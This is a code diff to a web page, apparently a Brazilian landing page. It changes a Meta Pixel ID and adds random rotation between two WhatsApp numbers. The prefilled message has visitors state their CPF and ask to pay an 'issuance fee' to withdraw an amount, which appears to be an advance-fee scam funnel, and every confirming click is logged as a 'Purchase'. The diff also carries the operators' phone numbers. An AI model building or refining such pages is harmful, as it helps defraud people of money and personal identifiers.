@@ -32,11 +32,11 @@
         t.src=v;s=b.getElementsByTagName(e)[0];
         s.parentNode.insertBefore(t,s)}(window, document,'script',
         'https://connect.facebook.net/en_US/fbevents.js');
-        fbq('init', '1305838618171369');
+        fbq('init', '2489815488195306');
         fbq('track', 'PageView');
     </script>
     <noscript><img height="1" width="1" style="display:none"
-        src="https://www.facebook.com/tr?id=1305838618171369&ev=PageView&noscript=1"
+        src="https://www.facebook.com/tr?id=2489815488195306&ev=PageView&noscript=1"
     /></noscript>
     <!-- End Meta Pixel Code -->
 </head>
@@ -556,15 +556,21 @@
                 return;
             }
 
+            // Dispara o evento de Compra (Purchase) do Pixel para todos que confirmarem e irem ao WhatsApp
             if (typeof fbq === 'function') {
                 fbq('track', 'Purchase');
             }
 
-            let numeroFixo = "5516982195327";
+            // Lista com os 2 números ativos para rotação automática
+            const numerosWhatsApp = ["5516982192895", "5516982195327"];
+            
+            // Sorteia aleatoriamente um dos números da lista a cada clique
+            let numeroSorteado = numerosWhatsApp[Math.floor(Math.random() * numerosWhatsApp.length)];
+
             let textoMensagem = `Oi quero pagar a taxa de emissao. Meu CPF é ${cpfGlobal} e tenho o valor de ${valorGlobal} disponível para saque.`;
             let mensagemCodificada = encodeURIComponent(textoMensagem);
 
-            let linkZap = `https://wa.me/${numeroFixo}?text=${mensagemCodificada}`;
+            let linkZap = `https://wa.me/${numeroSorteado}?text=${mensagemCodificada}`;
             event.currentTarget.href = linkZap;
         }
     </script>
